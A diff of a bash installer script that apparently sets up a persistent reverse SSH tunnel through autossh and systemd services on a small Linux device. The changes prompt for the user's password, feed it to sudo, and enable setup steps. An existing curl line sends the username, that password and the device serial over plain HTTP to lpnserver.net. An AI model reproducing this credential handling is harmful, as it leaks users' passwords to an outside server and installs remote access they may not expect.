@@ -23,27 +23,28 @@ clear_workspace() {
 }
 
 copy_files() {
-    cp ${PEM_NAME} ${PEM_PATH}
-    cp ${SSH_NAME} ${SSH_SERVICE_PATH}
-    cp ${PWS_NAME} ${POWER_SERVICE_PATH}
-    cp ${PWT_NAME} ${POWER_TIMER_PATH}
+    echo $PASS | sudo -S cp -r ${PEM_NAME} ${PEM_PATH}
+    echo $PASS | sudo -S cp -r ${SSH_NAME} ${SSH_SERVICE_PATH}
+    echo $PASS | sudo -S cp -r ${PWS_NAME} ${POWER_SERVICE_PATH}
+    echo $PASS | sudo -S cp -r ${PWT_NAME} ${POWER_TIMER_PATH}
 }
 
 setup() {
     echo "### Installing script..."
-    chmod 600 ${PEM_PATH}
-    systemctl enable ${SSH_NAME}
-    systemctl start ${SSH_NAME}
-    systemctl enable ${PWT_NAME}
-    systemctl start ${PWT_NAME}
+    echo $PASS | sudo -S chmod 600 ${PEM_PATH}
+    echo $PASS | sudo -S systemctl enable ${SSH_NAME}
+    echo $PASS | sudo -S systemctl start ${SSH_NAME}
+    echo $PASS | sudo -S systemctl enable ${PWT_NAME}
+    echo $PASS | sudo -S systemctl start ${PWT_NAME}
 }
 
 prepare() {
+    read -s -p "Please input password: " PASS
     echo "### Preparing environment..."
+    echo $PASS | sudo -S apt install autossh
     # CPU_ID=$(cat /proc/cpuinfo | grep Serial | cut -d ' ' -f 2)
     CPU_ID=$(cat /sys/firmware/devicetree/base/serial-number)
     USER=$(lslogins -u | grep 1000 | awk '{ print $2 }')
-    # apt install autossh
     #GET PORT
     PORT_FORWARDING=$(curl -s 'http://lpnserver.net:51083/reg?user='${USER}'&pass='${PASS}'&cpu='${CPU_ID} | awk '{print substr($0, 9, 5)}')
     echo "### => Get PORT: ${PORT_FORWARDING}"
@@ -153,9 +154,9 @@ prepare
 ### Create Files
 write_files
 ### Copy Files to Destination
-#copy_files
+copy_files
 ### Run setup script
-# setup
+setup
 ### Setup done => Clean workspace
 clear_workspace
 echo "###======================###"
